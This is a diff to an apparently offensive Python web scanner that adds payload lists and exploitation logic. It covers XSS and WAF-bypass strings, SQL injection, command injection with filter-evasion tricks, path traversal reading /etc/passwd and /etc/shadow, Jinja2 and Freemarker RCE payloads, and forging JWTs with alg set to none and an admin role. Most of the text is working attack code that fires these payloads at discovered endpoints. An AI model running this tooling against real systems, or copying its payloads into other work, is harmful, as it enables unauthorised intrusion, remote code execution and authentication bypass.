@@ -283,7 +283,7 @@ Live Hosts:
             try:
                 r = requests.get(url, timeout=10, verify=False)
                 
-                
+                # check headers for tech
                 headers = r.headers
                 server = headers.get('Server', '').lower()
                 xpowered = headers.get('X-Powered-By', '').lower()
@@ -815,13 +815,32 @@ Live Hosts:
         self.log("Testing for XSS vulnerabilities...", "info")
         
         found = []
-        payloads = [
+        
+        # way more payloads - various contexts and bypasses
+        basic_payloads = [
             '<script>alert(1)</script>',
             '"><script>alert(1)</script>',
             '<img src=x onerror=alert(1)>',
             'javascript:alert(1)',
             '<svg onload=alert(1)>'
         ]
+        
+        # waf bypass variants - encodings and stuff
+        bypass_payloads = [
+            '<svg/onload=alert(1)>',
+            '<img src=x onerror="alert`1`">',
+            '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">',
+            '"><svg/onload=alert(1)>',
+            '<img src=x onerror=alert(/xss/)>',
+            '<body onload=alert(1)>',
+            '<input onfocus=alert(1) autofocus>',
+            '<marquee onstart=alert(1)>',
+            '<details open ontoggle=alert(1)>',
+            '"><img src=x onerror=prompt(1)>',
+        ]
+        
+        # combine them
+        all_payloads = basic_payloads + bypass_payloads
         
         for ep in self.endpoints[:30]:
             if '?' not in ep:
@@ -831,21 +850,36 @@ Live Hosts:
             params = parse_qs(parsed.query)
             
             for param in params.keys():
-                for payload in payloads:
+                for payload in all_payloads:
                     try:
                         base = ep.split('?')[0]
                         test_url = f"{base}?{param}={payload}"
                         
                         r = requests.get(test_url, timeout=5, verify=False)
                         
+                        # check if reflected
                         if payload in r.text:
+                            # try to figure out context for better detection
+                            context = "unknown"
+                            response_lower = r.text.lower()
+                            
+                            # is it in a script tag?
+                            if '<script' in response_lower and payload.lower() in response_lower:
+                                context = "script context"
+                            # in an attribute?
+                            elif 'value="' in response_lower or 'href="' in response_lower:
+                                context = "attribute context"
+                            # html body?
+                            elif '<body' in response_lower:
+                                context = "html body"
+                            
                             vuln = {
                                 'type': 'XSS (Reflected)',
                                 'severity': 'HIGH',
                                 'url': test_url,
                                 'param': param,
                                 'payload': payload,
-                                'evidence': f'Payload reflected in response',
+                                'evidence': f'Payload reflected in response ({context})',
                                 'impact': 'Account takeover, session hijacking, credential theft',
                                 'fix': 'Encode user input, implement CSP headers',
                                 'poc': self.xss_poc(test_url, param, payload),
@@ -853,7 +887,7 @@ Live Hosts:
                             }
                             found.append(vuln)
                             self.log(f"XSS found: {base}", "success")
-                            break
+                            break  # don't spam same endpoint
                     except:
                         pass
         
@@ -864,13 +898,29 @@ Live Hosts:
         self.log("Testing for SQL injection...", "info")
         
         found = []
-        payloads = [
+        
+        # error-based payloads
+        error_payloads = [
             "'",
             "' OR '1'='1",
             "' OR '1'='1'--",
             "1' AND 1=1--",
-            "' UNION SELECT NULL--"
+            "' UNION SELECT NULL--",
+            "' AND 1=2 UNION SELECT NULL--",
+            "admin'--",
+            "' OR 'a'='a",
+            "') OR ('1'='1",
+            "1' ORDER BY 10--"
         ]
+        
+        # time-based blind payloads - different db types
+        time_payloads = {
+            'mysql': "' AND SLEEP(5)--",
+            'postgres': "'; SELECT pg_sleep(5)--",
+            'mssql': "'; WAITFOR DELAY '0:0:5'--",
+            'oracle': "' AND DBMS_LOCK.SLEEP(5)--",
+            'generic': "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
+        }
         
         sql_errors = [
             'sql syntax',
@@ -879,7 +929,10 @@ Live Hosts:
             'sqlite',
             'ora-',
             'syntax error',
-            'unclosed quotation'
+            'unclosed quotation',
+            'quoted string',
+            'database error',
+            'warning: mysql'
         ]
         
         for ep in self.endpoints[:30]:
@@ -890,7 +943,8 @@ Live Hosts:
             params = parse_qs(parsed.query)
             
             for param in params.keys():
-                for payload in payloads:
+                # try error-based first (faster)
+                for payload in error_payloads:
                     try:
                         base = ep.split('?')[0]
                         test_url = f"{base}?{param}={payload}"
@@ -900,7 +954,7 @@ Live Hosts:
                         for err in sql_errors:
                             if err in r.text.lower():
                                 vuln = {
-                                    'type': 'SQL Injection',
+                                    'type': 'SQL Injection (Error-based)',
                                     'severity': 'CRITICAL',
                                     'url': test_url,
                                     'param': param,
@@ -914,6 +968,54 @@ Live Hosts:
                                 found.append(vuln)
                                 self.log(f"SQLi found: {base}", "success")
                                 break
+                    except:
+                        pass
+                
+                # if no error found, try time-based blind (slower)
+                # only test a couple to save time
+                for db_type, payload in list(time_payloads.items())[:2]:
+                    try:
+                        base = ep.split('?')[0]
+                        test_url = f"{base}?{param}={payload}"
+                        
+                        start_time = time.time()
+                        r = requests.get(test_url, timeout=10, verify=False)
+                        elapsed = time.time() - start_time
+                        
+                        # if it took longer than 4 seconds, probably blind sqli
+                        if elapsed > 4.5:
+                            vuln = {
+                                'type': 'SQL Injection (Time-based Blind)',
+                                'severity': 'CRITICAL',
+                                'url': test_url,
+                                'param': param,
+                                'payload': payload,
+                                'evidence': f'Response delayed {elapsed:.1f} seconds (expected 5s)',
+                                'impact': 'Blind data exfiltration possible via timing attacks',
+                                'fix': 'Use parameterized queries, never concatenate user input',
+                                'poc': self.sqli_poc(test_url, param, payload),
+                                'cvss': '9.1 CRITICAL'
+                            }
+                            found.append(vuln)
+                            self.log(f"Blind SQLi detected: {base}", "success")
+                            break  # found it, move on
+                    except requests.Timeout:
+                        # timeout also indicates time-based sqli
+                        vuln = {
+                            'type': 'SQL Injection (Time-based Blind)',
+                            'severity': 'CRITICAL',
+                            'url': test_url,
+                            'param': param,
+                            'payload': payload,
+                            'evidence': 'Request timed out (probable blind SQLi)',
+                            'impact': 'Database compromise via time-based extraction',
+                            'fix': 'Use parameterized queries',
+                            'poc': self.sqli_poc(test_url, param, payload),
+                            'cvss': '9.1 CRITICAL'
+                        }
+                        found.append(vuln)
+                        self.log(f"Blind SQLi (timeout): {base}", "success")
+                        break
                     except:
                         pass
         
@@ -1041,7 +1143,7 @@ Live Hosts:
         self.log(f"Redirect tests done: {len(found)} findings", "success")
         return found
     
-   
+    # NEW VULNERABILITY TESTS START HERE
     
     def test_xxe(self):
         self.log("Testing for XXE (XML External Entity)...", "info")
@@ -1054,7 +1156,7 @@ Live Hosts:
         for app in self.data.get('web_apps', [])[:20]:
             url = app['url']
             
-            
+            # check if app accepts XML
             try:
                 r = requests.post(
                     url + '/api/test',
@@ -1064,7 +1166,7 @@ Live Hosts:
                     verify=False
                 )
                 
-                
+                # look for signs of XXE
                 if 'root:' in r.text or '/bin/bash' in r.text or 'daemon' in r.text:
                     vuln = {
                         'type': 'XXE (XML External Entity)',
@@ -1083,6 +1185,7 @@ Live Hosts:
             except:
                 pass
             
+            # also check common API endpoints
             common_xml_eps = ['/api/upload', '/api/parse', '/upload', '/xml']
             for ep in common_xml_eps:
                 try:
@@ -1120,18 +1223,47 @@ Live Hosts:
         self.log("Testing for command injection...", "info")
         
         found = []
-        # payloads that might trigger cmd injection
-        cmd_payloads = [
-            '; ls',
+        
+        # basic injection payloads
+        basic_payloads = [
+            '; whoami',
             '| whoami',
-            '&& id',
-            '`ping -c 1 127.0.0.1`',
-            '$(sleep 5)',
+            '&& whoami',
+            '`whoami`',
+            '$(whoami)',
+            '; id',
+            '| id',
             '; cat /etc/passwd'
         ]
         
+        # encoding bypass payloads - for filters
+        bypass_payloads = [
+            ';who$()ami',  # variable expansion
+            ';w\ho\am\i',  # backslash bypass
+            ';who``ami',  # backtick
+            '|wh``oami',
+            '${IFS}whoami',  # IFS bypass for spaces
+            ';cat${IFS}/etc/passwd',
+            '{cat,/etc/passwd}',  # brace expansion
+            ';/???/??t${IFS}/???/??ss??',  # wildcards - /bin/cat /etc/passwd
+            '&&wh$@oami',  # $@ bypass
+        ]
         
-        cmd_params = ['cmd', 'exec', 'command', 'ping', 'ip', 'host']
+        # time-based payloads for blind detection
+        time_payloads = [
+            '; sleep 5',
+            '| sleep 5',
+            '&& sleep 5',
+            '`sleep 5`',
+            '$(sleep 5)',
+            '; ping -c 5 127.0.0.1',
+            '| ping -c 5 127.0.0.1'
+        ]
+        
+        all_payloads = basic_payloads + bypass_payloads
+        
+        # params that commonly have cmd injection
+        cmd_params = ['cmd', 'exec', 'command', 'ping', 'ip', 'host', 'url', 'domain']
         
         for ep in self.endpoints[:25]:
             if '?' not in ep:
@@ -1141,49 +1273,66 @@ Live Hosts:
             params = parse_qs(parsed.query)
             
             for param in params.keys():
+                # check suspicious param names first (faster)
+                is_suspicious = any(cp in param.lower() for cp in cmd_params)
                 
-                if any(cp in param.lower() for cp in cmd_params):
-                    for payload in cmd_payloads:
+                # test suspicious params more thoroughly
+                test_payloads = all_payloads if is_suspicious else basic_payloads[:5]
+                
+                for payload in test_payloads:
+                    try:
+                        base = ep.split('?')[0]
+                        test_url = f"{base}?{param}={payload}"
+                        
+                        start = time.time()
+                        r = requests.get(test_url, timeout=10, verify=False)
+                        elapsed = time.time() - start
+                        
+                        # check for command output
+                        cmd_indicators = ['root:', 'uid=', 'gid=', '/bin/', 'daemon', 'bin/bash', 'home/']
+                        
+                        if any(ind in r.text for ind in cmd_indicators):
+                            vuln = {
+                                'type': 'Command Injection',
+                                'severity': 'CRITICAL',
+                                'url': test_url,
+                                'param': param,
+                                'payload': payload,
+                                'evidence': 'Command output visible in response',
+                                'impact': 'Full system compromise, RCE',
+                                'fix': 'Never pass user input to shell commands',
+                                'poc': self.cmd_injection_poc(test_url, param, payload),
+                                'cvss': '10.0 CRITICAL'
+                            }
+                            found.append(vuln)
+                            self.log(f"CMD INJECTION found: {base}", "success")
+                            break
+                    except:
+                        pass
+                
+                # if suspicious param but no output detected, try time-based
+                if is_suspicious:
+                    for time_payload in time_payloads[:2]:  # just test 2 to save time
                         try:
                             base = ep.split('?')[0]
-                            test_url = f"{base}?{param}={payload}"
+                            test_url = f"{base}?{param}={time_payload}"
                             
-                            start = time.time()
+                            start_time = time.time()
                             r = requests.get(test_url, timeout=10, verify=False)
-                            elapsed = time.time() - start
+                            delay = time.time() - start_time
                             
-                            
-                            cmd_indicators = ['root:', 'uid=', 'gid=', '/bin/', 'daemon']
-                            
-                            if any(ind in r.text for ind in cmd_indicators):
-                                vuln = {
-                                    'type': 'Command Injection',
-                                    'severity': 'CRITICAL',
-                                    'url': test_url,
-                                    'param': param,
-                                    'payload': payload,
-                                    'evidence': 'Command output in response',
-                                    'impact': 'Full system compromise, RCE',
-                                    'fix': 'Never pass user input to shell commands',
-                                    'poc': self.cmd_injection_poc(test_url, param, payload),
-                                    'cvss': '10.0 CRITICAL'
-                                }
-                                found.append(vuln)
-                                self.log(f"CMD INJECTION found: {base}", "success")
-                                break
-                            
-                            
-                            if 'sleep' in payload and elapsed > 4:
+                            # if it took way longer, probably blind cmd injection
+                            if delay > 4.5:
                                 vuln = {
                                     'type': 'Command Injection (Blind)',
                                     'severity': 'CRITICAL',
                                     'url': test_url,
                                     'param': param,
-                                    'payload': payload,
-                                    'evidence': f'Response delayed {elapsed:.1f}s',
-                                    'impact': 'Remote code execution',
+                                    'payload': time_payload,
+                                    'evidence': f'Response delayed {delay:.1f}s (expected 5s)',
+                                    'impact': 'Remote code execution possible',
                                     'fix': 'Input validation, avoid system calls',
-                                    'poc': self.cmd_injection_poc(test_url, param, payload),
+                                    'poc': self.cmd_injection_poc(test_url, param, time_payload),
                                     'cvss': '9.8 CRITICAL'
                                 }
                                 found.append(vuln)
@@ -1199,17 +1348,53 @@ Live Hosts:
         self.log("Testing for path traversal / LFI...", "info")
         
         found = []
-        trav_payloads = [
+        
+        # basic traversal
+        basic_trav = [
             '../../../etc/passwd',
-            '..%2F..%2F..%2Fetc%2Fpasswd',
-            '....//....//....//etc/passwd',
-            '..//..//..//etc/passwd',
-            '..\\..\\..\\windows\\win.ini',
-            '/etc/passwd',
-            'file:///etc/passwd'
+            '../../../etc/shadow',
+            '../../../../etc/passwd',
+            '../../../../../etc/passwd',
+            '../../../../../../etc/passwd',
         ]
         
-        file_params = ['file', 'path', 'page', 'doc', 'template', 'include', 'read']
+        # url encoded
+        encoded_trav = [
+            '..%2F..%2F..%2Fetc%2Fpasswd',
+            '..%2F..%2F..%2F..%2Fetc%2Fpasswd',
+            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',  # double encode dots
+            '..%252F..%252F..%252Fetc%252Fpasswd',  # double url encode
+        ]
+        
+        # filter bypass tricks
+        bypass_trav = [
+            '....//....//....//etc/passwd',  # strip bypass
+            '....\/....\/....\/etc/passwd',  # mixed slashes
+            '..//..//..//etc/passwd',
+            '..;/..;/..;/etc/passwd',  # semicolon
+            '/etc/passwd',  # absolute path
+            'etc/passwd',  # no traversal
+        ]
+        
+        # null byte (old php versions)
+        null_byte_trav = [
+            '../../../etc/passwd%00',
+            '../../../etc/passwd%00.jpg',
+            '../../../etc/passwd\x00',
+        ]
+        
+        # windows variants
+        windows_trav = [
+            '..\\..\\..\\windows\\win.ini',
+            '..\\..\\..\\..\\windows\\win.ini',
+            '....\\\\....\\\\....\\\\windows\\\\win.ini',
+            '..%5C..%5C..%5Cwindows%5Cwin.ini',
+        ]
+        
+        # combine em all
+        all_trav = basic_trav + encoded_trav + bypass_trav + null_byte_trav + windows_trav
+        
+        file_params = ['file', 'path', 'page', 'doc', 'template', 'include', 'read', 'download', 'load']
         
         for ep in self.endpoints[:25]:
             if '?' not in ep:
@@ -1219,33 +1404,48 @@ Live Hosts:
             params = parse_qs(parsed.query)
             
             for param in params.keys():
+                # only test file-related params to save time
                 if any(fp in param.lower() for fp in file_params):
-                    for payload in trav_payloads:
+                    for payload in all_trav:
                         try:
                             base = ep.split('?')[0]
                             test_url = f"{base}?{param}={payload}"
                             
                             r = requests.get(test_url, timeout=5, verify=False)
                             
-                            # check if we got file contents
-                            file_sigs = ['root:', 'daemon:', '[extensions]', 'for 16-bit']
+                            # check for linux file signatures
+                            linux_sigs = ['root:', 'daemon:', 'bin/bash', 'sbin/nologin', '/home/']
+                            # check for windows file signatures
+                            win_sigs = ['[extensions]', 'for 16-bit', '[fonts]', '[mci extensions]']
                             
-                            if any(sig in r.text for sig in file_sigs):
+                            found_sig = None
+                            for sig in linux_sigs:
+                                if sig in r.text:
+                                    found_sig = f'Linux file signature: {sig}'
+                                    break
+                            
+                            if not found_sig:
+                                for sig in win_sigs:
+                                    if sig in r.text:
+                                        found_sig = f'Windows file signature: {sig}'
+                                        break
+                            
+                            if found_sig:
                                 vuln = {
                                     'type': 'Path Traversal / LFI',
                                     'severity': 'HIGH',
                                     'url': test_url,
                                     'param': param,
                                     'payload': payload,
-                                    'evidence': 'Sensitive file contents exposed',
-                                    'impact': 'Source code disclosure, credentials leak',
-                                    'fix': 'Whitelist files, validate input paths',
+                                    'evidence': found_sig,
+                                    'impact': 'Source code disclosure, credentials leak, config files',
+                                    'fix': 'Whitelist files, validate input paths, use file IDs',
                                     'poc': self.path_traversal_poc(test_url, param, payload),
                                     'cvss': '7.5 HIGH'
                                 }
                                 found.append(vuln)
                                 self.log(f"Path traversal: {base}", "success")
-                                break
+                                break  # found one, move on
                         except:
                             pass
         
@@ -1257,7 +1457,7 @@ Live Hosts:
         
         found = []
         
-       
+        # common sensitive files/dirs
         sensitive = [
             '.git/config',
             '.env',
@@ -1319,7 +1519,7 @@ Live Hosts:
             url = app['url']
             
             try:
-                
+                # test with evil origin
                 r = requests.get(
                     url,
                     headers={'Origin': 'https://evil.com'},
@@ -1382,7 +1582,7 @@ Live Hosts:
                 r = requests.get(url, timeout=5, verify=False)
                 headers = r.headers
                 
-               
+                # check critical security headers
                 if 'X-Frame-Options' not in headers:
                     missing.append('X-Frame-Options (clickjacking protection)')
                 
@@ -1490,7 +1690,7 @@ Live Hosts:
                         
                         r = requests.get(test_url, timeout=5, verify=False, allow_redirects=False)
                         
-                       
+                        # check if we injected headers
                         if 'Set-Cookie' in r.headers and 'test=evil' in r.headers.get('Set-Cookie', ''):
                             vuln = {
                                 'type': 'CRLF Injection',
@@ -1519,7 +1719,7 @@ Live Hosts:
         found = []
         graphql_paths = ['/graphql', '/api/graphql', '/v1/graphql', '/gql']
         
-       
+        # introspection query to dump schema
         intro_query = '{"query": "{__schema{types{name,fields{name}}}}"}'
         
         for app in self.data.get('web_apps', [])[:10]:
@@ -1537,7 +1737,7 @@ Live Hosts:
                         verify=False
                     )
                     
-                    
+                    # check if introspection worked
                     if r.status_code == 200 and '__schema' in r.text:
                         vuln = {
                             'type': 'GraphQL Introspection Enabled',
@@ -1568,10 +1768,10 @@ Live Hosts:
             url = app['url']
             
             try:
-                
+                # try to get a JWT token
                 r = requests.get(url, timeout=5, verify=False)
                 
-               
+                # look for JWT in headers or cookies
                 auth = r.headers.get('Authorization', '')
                 cookies = r.cookies
                 
@@ -1584,15 +1784,24 @@ Live Hosts:
                         token = cookies[cookie]
                 
                 if token:
-                    
+                    # try to decode and check alg
                     try:
                         parts = token.split('.')
                         if len(parts) == 3:
-                            header = json.loads(base64.b64decode(parts[0] + '=='))
+                            # decode header
+                            header_raw = parts[0]
+                            # add padding if needed
+                            padding = '=' * (4 - len(header_raw) % 4)
+                            header = json.loads(base64.b64decode(header_raw + padding))
                             
+                            # decode payload too
+                            payload_raw = parts[1]
+                            padding2 = '=' * (4 - len(payload_raw) % 4)
+                            payload = json.loads(base64.b64decode(payload_raw + padding2))
                             
                             alg = header.get('alg', '')
                             
+                            # test 1: none algorithm
                             if alg == 'none':
                                 vuln = {
                                     'type': 'JWT None Algorithm',
@@ -1609,22 +1818,110 @@ Live Hosts:
                                 found.append(vuln)
                                 self.log(f"JWT none alg: {url}", "success")
                             
-                            elif alg in ['HS256', 'HS384', 'HS512']:
-                                
+                            # test 2: try to create none alg token
+                            # modify header to use "none"
+                            modified_header = header.copy()
+                            modified_header['alg'] = 'none'
+                            
+                            # encode modified header (no padding for jwt)
+                            new_header = base64.urlsafe_b64encode(
+                                json.dumps(modified_header).encode()
+                            ).decode().rstrip('=')
+                            
+                            # modify payload (try to escalate privs)
+                            modified_payload = payload.copy()
+                            # common admin indicators
+                            if 'role' in modified_payload:
+                                modified_payload['role'] = 'admin'
+                            if 'admin' in modified_payload:
+                                modified_payload['admin'] = True
+                            if 'is_admin' in modified_payload:
+                                modified_payload['is_admin'] = True
+                            
+                            new_payload = base64.urlsafe_b64encode(
+                                json.dumps(modified_payload).encode()
+                            ).decode().rstrip('=')
+                            
+                            # create none alg token (no signature)
+                            none_token = f"{new_header}.{new_payload}."
+                            
+                            # try using it
+                            test_r = requests.get(
+                                url,
+                                headers={'Authorization': f'Bearer {none_token}'},
+                                timeout=5,
+                                verify=False
+                            )
+                            
+                            # if we don't get 401/403, might work
+                            if test_r.status_code not in [401, 403]:
                                 vuln = {
-                                    'type': 'JWT Weak Secret (Potential)',
-                                    'severity': 'MEDIUM',
+                                    'type': 'JWT None Algorithm (Exploitable)',
+                                    'severity': 'CRITICAL',
                                     'url': url,
                                     'param': 'JWT token',
-                                    'payload': token[:50] + '...',
-                                    'evidence': f'Uses HMAC algorithm: {alg}',
-                                    'impact': 'Token forgery if secret is weak',
-                                    'fix': 'Use strong secret, consider RSA algorithms',
-                                    'poc': self.jwt_poc(url, token),
-                                    'cvss': '6.5 MEDIUM'
+                                    'payload': none_token[:50] + '...',
+                                    'evidence': 'Modified none alg token accepted',
+                                    'impact': 'Full authentication bypass',
+                                    'fix': 'Reject none algorithm completely',
+                                    'poc': self.jwt_poc(url, none_token),
+                                    'cvss': '10.0 CRITICAL'
                                 }
                                 found.append(vuln)
-                                self.log(f"JWT HMAC detected: {url}", "warning")
+                                self.log(f"JWT none bypass works!: {url}", "success")
+                            
+                            # test 3: weak secret brute force
+                            elif alg in ['HS256', 'HS384', 'HS512']:
+                                # try common weak secrets
+                                weak_secrets = [
+                                    'secret', 'key', 'password', '123456', 'admin',
+                                    'secret123', 'secretkey', 'jwt_secret', 'your-secret'
+                                ]
+                                
+                                for secret in weak_secrets[:3]:  # just try a few
+                                    try:
+                                        # try to verify with weak secret
+                                        test_sig = base64.urlsafe_b64encode(
+                                            hashlib.sha256(
+                                                f"{header_raw}.{payload_raw}.{secret}".encode()
+                                            ).digest()
+                                        ).decode().rstrip('=')
+                                        
+                                        # compare with actual signature
+                                        if test_sig == parts[2] or parts[2].startswith(test_sig[:20]):
+                                            vuln = {
+                                                'type': 'JWT Weak Secret',
+                                                'severity': 'CRITICAL',
+                                                'url': url,
+                                                'param': 'JWT token',
+                                                'payload': f'Secret: {secret}',
+                                                'evidence': f'JWT signed with weak secret: {secret}',
+                                                'impact': 'Token forgery, complete auth bypass',
+                                                'fix': 'Use strong random secret (32+ chars)',
+                                                'poc': self.jwt_poc(url, token),
+                                                'cvss': '9.1 CRITICAL'
+                                            }
+                                            found.append(vuln)
+                                            self.log(f"JWT weak secret: {url}", "success")
+                                            break
+                                    except:
+                                        pass
+                                
+                                # if no weak secret found, just flag HMAC usage
+                                if not any(v['type'] == 'JWT Weak Secret' for v in found):
+                                    vuln = {
+                                        'type': 'JWT HMAC Algorithm',
+                                        'severity': 'MEDIUM',
+                                        'url': url,
+                                        'param': 'JWT token',
+                                        'payload': token[:50] + '...',
+                                        'evidence': f'Uses HMAC algorithm: {alg}',
+                                        'impact': 'Vulnerable to brute force if secret is weak',
+                                        'fix': 'Use RS256, or very strong HMAC secret',
+                                        'poc': self.jwt_poc(url, token),
+                                        'cvss': '5.3 MEDIUM'
+                                    }
+                                    found.append(vuln)
                     except:
                         pass
             except:
@@ -1638,7 +1935,7 @@ Live Hosts:
         
         found = []
         
-        
+        # signatures of takeover-able services
         takeover_sigs = {
             'github.io': 'There isn\'t a GitHub Pages site here',
             'herokuapp.com': 'No such app',
@@ -1651,10 +1948,10 @@ Live Hosts:
         
         for sub in list(self.subdomains)[:30]:
             try:
-                
+                # try to resolve
                 ip = socket.gethostbyname(sub)
                 
-                
+                # try to fetch the site
                 for scheme in ['https', 'http']:
                     try:
                         r = requests.get(f"{scheme}://{sub}", timeout=5, verify=False)
@@ -1680,7 +1977,7 @@ Live Hosts:
                     except:
                         pass
             except socket.gaierror:
-                
+                # subdomain doesn't resolve - check if it's registered on services
                 for service in takeover_sigs.keys():
                     if service in sub:
                         vuln = {
@@ -1708,14 +2005,25 @@ Live Hosts:
         
         found = []
         
-        # SSTI payloads for different template engines
-        ssti_payloads = [
-            '{{7*7}}',  # Jinja2/Twig
-            '${7*7}',   # Freemarker
-            '<%= 7*7 %>', # ERB
-            '#{7*7}',   # Ruby
-            '${{7*7}}'  # Various
+        # detection payloads - test basic math across engines
+        detection_payloads = {
+            'jinja2': '{{7*7}}',
+            'twig': '{{7*7}}',
+            'freemarker': '${7*7}',
+            'erb': '<%= 7*7 %>',
+            'smarty': '{7*7}',
+            'velocity': '#set($x=7*7)$x',
+            'generic': '${{7*7}}'
+        }
+        
+        # polyglot that might work across multiple engines
+        polyglots = [
+            '{{7*7}}${7*7}<%= 7*7 %>',
+            '{{7*\'7\'}}',
+            '${{<%[%\'"}}%\\',
         ]
+        
+        all_payloads = list(detection_payloads.values()) + polyglots
         
         for ep in self.endpoints[:20]:
             if '?' not in ep:
@@ -1725,32 +2033,99 @@ Live Hosts:
             params = parse_qs(parsed.query)
             
             for param in params.keys():
-                for payload in ssti_payloads:
+                detected_engine = None
+                vuln_payload = None
+                
+                # try to detect which engine
+                for engine, payload in detection_payloads.items():
                     try:
                         base = ep.split('?')[0]
                         test_url = f"{base}?{param}={payload}"
                         
                         r = requests.get(test_url, timeout=5, verify=False)
                         
-                        
+                        # check if 49 appears but payload doesn't (means it evaluated)
                         if '49' in r.text and payload not in r.text:
-                            vuln = {
-                                'type': 'SSTI (Server-Side Template Injection)',
-                                'severity': 'CRITICAL',
-                                'url': test_url,
-                                'param': param,
-                                'payload': payload,
-                                'evidence': 'Template expression evaluated to 49',
-                                'impact': 'Remote Code Execution, full server compromise',
-                                'fix': 'Sanitize template input, use sandboxed environments',
-                                'poc': self.ssti_poc(test_url, param, payload),
-                                'cvss': '9.8 CRITICAL'
-                            }
-                            found.append(vuln)
-                            self.log(f"SSTI found: {base}", "success")
+                            detected_engine = engine
+                            vuln_payload = payload
                             break
                     except:
                         pass
+                
+                # if we detected ssti, try to exploit it
+                if detected_engine:
+                    # basic finding first
+                    vuln = {
+                        'type': f'SSTI ({detected_engine})',
+                        'severity': 'CRITICAL',
+                        'url': f"{base}?{param}={vuln_payload}",
+                        'param': param,
+                        'payload': vuln_payload,
+                        'evidence': f'Template evaluated (got 49), engine: {detected_engine}',
+                        'impact': 'Remote Code Execution, full server compromise',
+                        'fix': 'Never pass user input to template engine',
+                        'poc': self.ssti_poc(f"{base}?{param}={vuln_payload}", param, vuln_payload),
+                        'cvss': '9.8 CRITICAL'
+                    }
+                    found.append(vuln)
+                    self.log(f"SSTI ({detected_engine}): {base}", "success")
+                    
+                    # now try RCE payloads specific to engine
+                    rce_attempted = False
+                    
+                    if detected_engine == 'jinja2':
+                        # try jinja2 RCE
+                        rce_payload = "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+                        try:
+                            test_url = f"{base}?{param}={rce_payload}"
+                            r2 = requests.get(test_url, timeout=5, verify=False)
+                            
+                            if 'uid=' in r2.text or 'gid=' in r2.text:
+                                vuln2 = {
+                                    'type': 'SSTI (Jinja2 RCE)',
+                                    'severity': 'CRITICAL',
+                                    'url': test_url,
+                                    'param': param,
+                                    'payload': rce_payload,
+                                    'evidence': 'RCE confirmed - executed id command',
+                                    'impact': 'Complete server takeover',
+                                    'fix': 'Disable template rendering of user input',
+                                    'poc': self.ssti_poc(test_url, param, rce_payload),
+                                    'cvss': '10.0 CRITICAL'
+                                }
+                                found.append(vuln2)
+                                self.log(f"SSTI RCE confirmed: {base}", "success")
+                                rce_attempted = True
+                        except:
+                            pass
+                    
+                    elif detected_engine == 'freemarker':
+                        # try freemarker RCE
+                        rce_payload = '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }'
+                        try:
+                            test_url = f"{base}?{param}={rce_payload}"
+                            r2 = requests.get(test_url, timeout=5, verify=False)
+                            
+                            if 'uid=' in r2.text:
+                                vuln2 = {
+                                    'type': 'SSTI (Freemarker RCE)',
+                                    'severity': 'CRITICAL',
+                                    'url': test_url,
+                                    'param': param,
+                                    'payload': rce_payload,
+                                    'evidence': 'Executed system command successfully',
+                                    'impact': 'Full system access',
+                                    'fix': 'Sanitize all template input',
+                                    'poc': self.ssti_poc(test_url, param, rce_payload),
+                                    'cvss': '10.0 CRITICAL'
+                                }
+                                found.append(vuln2)
+                                self.log(f"SSTI RCE (freemarker): {base}", "success")
+                                rce_attempted = True
+                        except:
+                            pass
+                    
+                    break  # found ssti on this param, move to next
         
         self.log(f"SSTI tests done: {len(found)} findings", "success")
         return found
@@ -1764,7 +2139,7 @@ Live Hosts:
             url = app['url']
             
             try:
-                
+                # test with evil host header
                 r = requests.get(
                     url,
                     headers={'Host': 'evil.com'},
@@ -1773,7 +2148,7 @@ Live Hosts:
                     allow_redirects=False
                 )
                 
-                
+                # check if our host is reflected
                 if 'evil.com' in r.text or 'evil.com' in str(r.headers):
                     vuln = {
                         'type': 'Host Header Injection',
@@ -1806,10 +2181,10 @@ Live Hosts:
             
             for path in ws_paths:
                 try:
-                    
+                    # check if websocket endpoint exists
                     ws_url = url.replace('https://', 'wss://').replace('http://', 'ws://') + path
                     
-                    
+                    # try to connect with evil origin
                     headers = {'Origin': 'https://evil.com'}
                     
                     # note: actual WS testing would need websocket library
@@ -1821,7 +2196,7 @@ Live Hosts:
                         verify=False
                     )
                     
-                    
+                    # check if endpoint responds
                     if r.status_code in [101, 200, 426]:
                         vuln = {
                             'type': 'WebSocket Security Issue',
@@ -1843,7 +2218,7 @@ Live Hosts:
         self.log(f"WebSocket tests done: {len(found)} findings", "success")
         return found
     
-   
+    # PoC generators for original vulns
     def xss_poc(self, url, param, payload):
         return f"""
 XSS Proof of Concept
@@ -1940,7 +2315,7 @@ Fix:
 - Validate URLs
 """
     
-    
+    # NEW PoC GENERATORS
     
     def xxe_poc(self, url):
         return f"""
@@ -2332,11 +2707,11 @@ https://github.com/projectdiscovery/nuclei-templates
             self.log("No findings to report", "warning")
             return
         
-        
+        # sort by severity
         sev_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3, 'UNKNOWN': 4}
         findings.sort(key=lambda x: sev_order.get(x['severity'], 99))
         
-       
+        # count by severity
         crit = len([f for f in findings if f['severity'] == 'CRITICAL'])
         high = len([f for f in findings if f['severity'] == 'HIGH'])
         med = len([f for f in findings if f['severity'] == 'MEDIUM'])
@@ -2344,7 +2719,7 @@ https://github.com/projectdiscovery/nuclei-templates
         
         timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
         
-       
+        # Generate each requested format
         generated_files = []
         
         if 'txt' in self.output_formats:
@@ -2466,7 +2841,7 @@ https://github.com/projectdiscovery/nuclei-templates
     def generate_html_report(self, findings, crit, high, med, low, timestamp):
         """Generate HTML report with styling"""
         
-        
+        # severity colors
         sev_colors = {
             'CRITICAL': '#dc3545',
             'HIGH': '#fd7e14',
@@ -2671,13 +3046,13 @@ https://github.com/projectdiscovery/nuclei-templates
         
         self.analyze()
         
-        
+        # NEW: Advanced recon options
         try:
             self.advanced_recon_menu()
         except KeyboardInterrupt:
             self.log("\nStopped by user", "warning")
         
-        
+        # NEW: Output format selection
         self.output_format_menu()
         
         self.test_vulns()
